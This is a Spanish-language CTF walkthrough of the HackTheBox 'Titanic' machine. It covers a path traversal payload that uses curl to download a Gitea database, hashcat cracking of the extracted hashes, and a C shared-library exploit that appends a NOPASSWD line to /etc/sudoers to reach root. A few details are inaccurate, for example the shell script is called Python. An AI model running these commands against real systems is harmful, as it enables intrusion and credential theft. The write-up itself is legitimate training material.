***
- Tags: #PathTraversal
****
Vamos a resolver la máquina Titanic. 
- Categoría: Fácil
- Sistema: Linux
- IP: `10.10.11.55`

### 1. Enumeración

Realizamos un primer escaneo con [[nmap]] al host. Descubrimos que tiene los puertos 22 ([[SSH - Secure Shell]]) y 80 abiertos. Con una enumeración de la versión de dichos puertos, obtenemos lo siguiente:

```bash
# Nmap 7.95 scan initiated Mon May 19 15:17:37 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN targeted 10.10.11.55
Nmap scan report for 10.10.11.55
Host is up (0.034s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 19 15:17:45 2025 -- 1 IP address (1 host up) scanned in 8.07 seconds
```

Navegamos a la web, encontrándonos con que necesitamos añadir el dominio `titanic.htb` al archivo `/etc/hosts`. Lo hacemos modificando manualmente el archivo con `sudo nano` o con el siguiente comando:

```bash
echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts > /dev/null
```

y cargamos en nuestro navegador la web. Tras navegar un poco, vemos que hay una opción para pedir un ticket.

> *Si poniendo en el buscador de Firefox titanic.htb nos hace la búsqueda de Google, vamos a `about:config` y añadimos la siguiente opción: `browser.fixup.domainwhitelist.htb`*

![[Titanic_1.png| 400]]

Capturamos el submit con BurpSuite y comprobamos que se efectúa una llamada POST donde nos devuelven un fichero JSON. 

![[Titanic_2.png]]


Ahora volvemos a interceptar la llamada GET de dicha descarga. Tras hacer algunas pruebas, comprobamos rápidamente que podemos modificar el archivo a descargar en esa ruta:

![[Titanic_3.png]]

Por tanto, la primera vulnerabilidad que nos encontramos es que el servidor es vulnerable a Path Traversal. 
### 2. Foothold

Ahora realizaremos la búsqueda de subdominios existentes. Para ello, existen muchas herramientas, pero en este caso usaremos `wfuzz` de esta manera:

```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb" --hc 301
```

> *Se añade `--hc 301` porque salía para cada subdominio ese código de estado y así filtramos información de forma más correcta*

Tras un rato, obtenemos con el código de estado 200 el subdominio `dev`. Lo añadimos al `/etc/hosts`. Accedemos a este dominio de dev y vemos las siguientes características respecto a la web:

- Gitea v1.22.1
- API
- Formularios de login y registro

##### Gitea

Realizamos una búsqueda con `searchsploit` para ver si podría ser vulnerable a algún tipo de exploit ya conocido:

```shell
searchsploit gitea     
------------------------------------
 Exploit Title                                                                                                                      
------------------------------------
Gitea 1.12.5 - Remote Code Execution (Authenticated)                                                                                
Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit)                                                                             
Gitea 1.22.0 - Stored XSS                                                                                                           
Gitea 1.4.0 - Remote Code Execution                                                                                                 
Gitea 1.7.5 - Remote Code Execution                                                                                                 
------------------------------------
Shellcodes: No Results
```

Pero no encontramos nada interesante.

##### API

Enumerando la API, vemos que Swagger se encuentra expuesto, así que accedemos a la documentación de la API sin problema. 

![[Titanic_4.png]]

Sin embargo, cualquier llamada que queramos realizar nos pide autorización, de la que no disponemos, por lo que tendremos que buscar otra forma de saltarnos el token para poder interactuar con la API sin problemas. 

##### Login y registro

Podemos registrarnos con cualquier usuario y nos encontramos con que tenemos acceso a dos repositorios: `developer/docker-config` y `developer/flask-app`. Además, podemos listar usuarios existentes, encontrando los siguientes:

![[Titanic_5.png]]

Además, navegando por los repositorios previamente listados, encontramos un archivo YAML con información sobre credenciales MySQL:

```yaml
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

Y sobre Gitea:

```yaml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

Si bien el puerto 3306 no se encuentra expuesto de primeras, una vez logremos entrar, tendremos una forma de entrar a la base de datos MySQL. Volviendo al Path Traversal que previamente descubrimos, enumerando el archivo `/etc/passwd` descubrimos que existen los usuarios root y developer. Dado que esto es una máquina de HTB, nos enfocaremos ahora en encontrar la flag del usuario, que se encuentra en la ruta `/home/developer/user.txt`. 

Nuestro siguiente objetivo es entrar en el sistema como usuario. Dado que sabemos que existe el usuario `developer`, intentaremos entrar con este usuario. Aprovechando que tenemos una vulnerabilidad Path Traversal y que está corriendo con Gitea, enumeramos con Google que el archivo `/etc/gitea/conf/app.ini` contiene mucha información interesante, aunque gracias al archivo `yaml` sabemos que se encuentra en otra ruta, en este caso: `/home/developer/gitea/data:/data`.

Volvemos al BurpSuite y en el GET ponemos como ruta la siguiente: `/home/developer/gitea/data/gitea/conf/app.ini`.

![[Titanic_6.png]]

Llama la atención ese archivo de configuración de la BBDD. Lo mostramos y vemos mucha información encriptada. Para facilitar un poco las cosas, lo descargamos usando `curl`:

```bash
curl -X GET "http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db" \
-H "Host: titanic.htb" \
--output gitea.db
```

Para interactuar con el archivo de base de datos podemos abrirlo con `sqlite3 gitea.db`. Al escribir `SELECT * FROM user;` vemos los hashes de los usuarios. Necesitamos crackear dichos hashes. Para hacer esto, primero buscamos una forma de extraer automáticamente de gitea los hashes para luego crackearlos cómodamente. Para ello, usamos un script de Python obtenido de aquí:

```bash
wget https://gist.githubusercontent.com/h4rithd/0c5da36a0274904cafb84871cf14e271/raw/f109d178edbe756f15060244d735181278c9b57e/gitea2hashcat.py
```

Después, lo usamos con Python3: 

```bash
python3 ../exploits/gitea2hashcat.py gitea.db > hashes.txt
```

Dado que sabemos que el segundo usuario es `developer` (porque es el segundo en la lista de usuarios que vimos en Gitea al listar usuarios), que es el que nos interesa, lo guardamos aparte y usamos Hashcat con el módulo 10900 (por ser SHA256). 

```bash
hashcat -m 10900 hash_developer.txt /usr/share/wordlists/rockyou.txt 
```

Tras un rato esperando, obtenemos la contraseña del usuario, que es `25282528`. Ya tenemos el usuario y la contraseña, sólo nos falta entrar con SSH y ya tendríamos una shell como usuario. 

> *Podemos tener una tty funcional ahora siguiendo los pasos que ya conocemos, aunque el Ctrl+Z no funciona por alguna razón*
> 1. `script /dev/null -c bash `
> 2. `export xterm`
> 3. `export TERM=xterm`
> 4.  `export SHELL=bash`
### 3. Escalada de privilegios

Vimos previamente que existen credenciales para MySQL, así que intentamos conectarnos, pero no nos deja.

```bash
developer@titanic:~$ mysql -u root -p
Enter password: 
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)
```

Así que procedemos a realizar los pasos comunes.

##### Búsqueda de archivos SUID

```bash
find / -type f -perm -4000 2>/dev/null
```

De todos los archivos que salen, parecen interesantes `su`, `pkexec` y `sudo`, pero todos piden contraseña y no nos deja ejecutarlos.

##### Identificando crontabs

```bash
developer@titanic:~$ crontab -l
no crontab for developer
```

No hay crontabs asignadas. 
##### Identificando procesos y archivos relevantes

Usamos los comandos `ps aux` y `lsof` para ver si existe algún proceso interesante ejecutándose:

```bash
developer@titanic:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
develop+    1174  0.0  0.7 260564 30612 ?        Ss   13:15   0:01 /usr/bin/python3 /opt/app/app.py
develop+    1737  0.2  4.2 1402440 170012 ?      Ssl  13:15   0:09 /usr/local/bin/gitea web
develop+    3659  0.0  0.2  17068  9560 ?        Ss   14:26   0:00 /lib/systemd/systemd --user
develop+    3759  0.0  0.1   9120  5140 pts/0    Ss   14:26   0:00 -bash
develop+    3794  0.0  0.0   6208  1176 pts/0    S+   14:27   0:00 script /dev/null -c bash
develop+    3795  0.0  0.1   9112  5292 pts/1    Ss   14:27   0:00 bash
develop+    3947  0.0  0.0  10464  3208 pts/1    R+   14:33   0:00 ps aux
```

Llama la atención `/opt/app/app.py`. Navegamos a la carpeta `/opt` en busca de archivos dentro interesantes, y encontramos esto:

```bash
developer@titanic:/opt$ ls -la
total 20
drwxr-xr-x  5 root root      4096 Feb  7 10:37 .
drwxr-xr-x 19 root root      4096 Feb  7 10:37 ..
drwxr-xr-x  5 root developer 4096 Feb  7 10:37 app
drwx--x--x  4 root root      4096 Feb  7 10:37 containerd
drwxr-xr-x  2 root root      4096 Feb  7 10:37 scripts
developer@titanic:/opt$ 
```

Si nos fijamos bien, la carpeta scripts tiene permisos de lectura para nosotros, por lo que podemos entrar. Dentro, hay un script de Python llamado `identify_images.sh` que hace lo siguiente:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

En resumen:
1. Cambia el directorio de trabajo a `/opt/app/static/assets/images`
2. Vacía el archivo `metadata.log` con `truncate -s 0 metadata.log`
3. Busca todos los archivos de imagen `.jpg` dentro de la carpeta `/opt/app/static/assets/images/`.
4. Procesa las imágenes usando `identity` de ImageMagick y guarda el metadata en `metadata.log`

Esto significa que cualquier JPG en la carpeta `/opt/app/static/assets/images` será automáticamente procesado por `identity` cuando corre el script. Investigando vulnerabilidades de ImageMagick, descubrimos que existe un exploit para ejecutar comandos arbitrarios. El exploit está en lenguaje C y es el siguiente:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```

Finalmente compilamos el binario:

```
gcc -fPIC -shared -o ./libxcb.so.1 exploit.c -nostartfiles
```

Y ya tenemos acceso a comandos como root, así que obtenemos la flag.

```bash
developer@titanic:/opt/app/static/assets/images$ sudo cat /root/root.txt
c9ebdb51ba74a579b7c04ce0c3c741b2
```

